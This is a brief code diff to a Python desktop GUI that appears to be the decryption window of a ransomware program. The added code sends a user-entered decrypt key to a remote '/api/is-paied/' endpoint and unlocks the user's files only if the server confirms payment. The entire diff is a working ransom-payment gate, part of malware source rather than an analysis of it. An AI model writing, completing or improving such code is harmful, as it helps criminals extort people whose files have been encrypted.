@@ -1,5 +1,9 @@
 import tkinter
 import customtkinter
+import requests
+from env import BASE_API_URL
+from encrypter import Encrypter
+from device_infos import get_user_path
 
 
 customtkinter.set_appearance_mode("Dark")
@@ -12,7 +16,17 @@ app.geometry("350x250")
 
 def decrypt_function():
     input_value= input.get()
+
     print(input_value)
+
+    response = requests.get(BASE_API_URL + '/api/is-paied/' + input_value)
+
+    if response.status_code == 200:
+        is_paid = response.json()
+
+        if is_paid['is_paied'] is True:
+            encrypter = Encrypter(input_value)
+            encrypter.decrypt(get_user_path(), ('.ini'))
 
 
 input = customtkinter.CTkEntry(app, placeholder_text="DECRYPT_KEY", width=230, height=35)
